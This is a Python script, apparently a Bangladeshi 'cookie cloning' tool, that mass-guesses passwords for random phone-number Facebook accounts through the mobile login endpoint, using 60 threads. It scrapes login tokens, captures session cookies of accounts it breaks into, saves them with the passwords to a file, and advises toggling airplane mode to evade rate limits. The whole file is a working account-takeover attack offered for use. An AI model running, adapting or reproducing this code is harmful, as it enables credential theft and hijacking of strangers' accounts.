import os, time, sys, uuid, random, requests, re
from concurrent.futures import ThreadPoolExecutor

# ANSI Colors
R = '\033[1;31m'; G = '\033[1;32m'; Y = '\033[1;33m'; B = '\033[1;34m'; P = '\033[1;35m'; W = '\033[1;37m'

loop = 0
ok = []

def banner():
    os.system('clear')
    # Automatically opens your link as per screenshot
    # os.system('xdg-open https://t.me/md_malek') 
    print(f"""
{R}     ███    ███  ███████  ████████  █████  
{G}     ████  ████  ██          ██    ██   ██ 
{Y}     ██ ████ ██  █████       ██    ███████ 
{B}     ██  ██  ██  ██          ██    ██   ██ 
{P}     ██      ██  ███████     ██    ██   ██ 
{W}×××××××××××××××××××××××××××××××××××××××××××××××××
 [✓] DEVELOPER : MD MALEK ISLAM (META REAL)
 [✓] TEAM      : CYBER STRIKER TEAM
 [✓] LOGIC     : HYBRID REFACTOR (RAFI SAR + MALEK)
 [✓] STATUS    : 10,000 LIMIT OPTIMIZED
{W}×××××××××××××××××××××××××××××××××××××××××××××××××""")

def main():
    banner()
    print(f'{R}[•] {G}SALAMU ALAIKUM{W}')
    print(f'{R}[•] {G}CYBER STRIKER TEAM{W}')
    print(f'{G}×××××××××××××××××××××××××××××××××××××××××××××××××{W}')
    print(f'{G}[1] START 100% COOKIE MINING')
    print(f'[0] EXIT')
    print(f'×××××××××××××××××××××××××××××××××××××××××××××××××{W}')
    
    choose = input(f'{R}[▼] {G}CHOOSE : {W}')
    if choose == '1':
        cloning_start()
    elif choose == '0':
        sys.exit()
    else:
        main()

def cloning_start():
    banner()
    print(f'{R}[•] {G}BD CODE- -> 016 017 018 019{W}')
    code = input(f'{G}[+] ENTER SIM CODE: {W}')
    print(f'{G}×××××××××××××××××××××××××××××××××××××××××××××××××{W}')
    limit = 10000 # Your requested 10k limit
    
    # Using 60 workers for Laptop power (Multi-threading)
    with ThreadPoolExecutor(max_workers=60) as meta:
        banner()
        print(f'{G}[+]  TARGET DOMAIN:  RANDOM CLONING')
        print(f'[+]  TOTAL LIMIT: {limit}')
        print(f'[+]  METHOD: TOUCH-ASYNC (SAR LOGIC)')
        print(f'{Y}[!]  TIP: TOGGLE AIRPLANE MODE EVERY 500 SCANS{W}')
        print(f'×××××××××××××××××××××××××××××××××××××××××××××××××{W}\n')
        
        for _ in range(limit):
            uid = code + "".join(random.choices("0123456789", k=8))
            meta.submit(touch_engine, uid, limit)

    print(f'\n{G}×××××××××××××××××××××××××××××××××××××××××××××××××{W}')
    print(f'{G}[+] CRACK PROCESS COMPLETED')
    print(f'[+] TOTAL OK: {len(ok)}')
    print(f'×××××××××××××××××××××××××××××××××××××××××××××××××{W}')
    input(f'\n{G} [ BACK ]{W}')
    main()

def touch_engine(uid, limit):
    global loop, ok
    # Standard Running Status
    sys.stdout.write(f'\r{G}[MALEK-RUNNING] {loop}/{limit} [OK:{len(ok)}]'); sys.stdout.flush()
    
    # Combined Password Logic (Your 6-digit + Job/Pathao/Bongo list)
    pws = [uid, uid[6:], uid[-6:], "@@##1122", "778899", "police786", "bangladesh"]
    
    for pas in pws:
        session = requests.Session()
        # Rafi Sar's Special Touch Async Link
        url = "https://touch.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100"
        
        # 10 Items Refactored Header
        headers = {
            'Host': 'touch.facebook.com',
            'X-FB-LSD': str(uuid.uuid4()),
            'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"',
            'sec-ch-ua-mobile': '?1',
            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36",
            'Accept': '/',
            'Origin': 'https://touch.facebook.com',
            'Referer': 'https://touch.facebook.com/login/',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'en-US,en;q=0.9',
            'X-Requested-With': 'XMLHttpRequest'
        }

        try:
            # Rafi Sar's Extraction Logic
            res = session.get('https://touch.facebook.com/login/').text
            # Full Body Refactor with 10+ Items
            data = {
                "lsd": re.search('name="lsd" value="(.*?)"', str(res)).group(1),
                "jazoest": re.search('name="jazoest" value="(.*?)"', str(res)).group(1),
                "m_ts": re.search('name="m_ts" value="(.*?)"', str(res)).group(1),
                "li": re.search('name="li" value="(.*?)"', str(res)).group(1),
                "try_number": "0",
                "unrecognized_tries": "0",
                "email": uid, 
                "pass": pas,
                "login": "Log In",
                "bi_xrwh": "0"
            }
            
            # Response Refactor
            post = session.post(url, data=data, headers=headers)
            
            if 'c_user' in session.cookies.get_dict():
                ok.append(uid)
                print(f'\n{G}[MALEK-OK💚] {uid} • {pas}')
                ck = "; ".join([f"{k}={v}" for k, v in session.cookies.get_dict().items()])
                # 100% Success Cookie Print
                print(f'{G}[🌺] COOKIE = {ck}\n')
                
                # Auto-save (Mumu Player path)
                with open('/sdcard/ok.txt', 'a') as f:
                    f.write(f'{uid}|{pas}|{ck}\n')
                break
        except: pass
    loop += 1

if _name_ == "_main_":
    main()
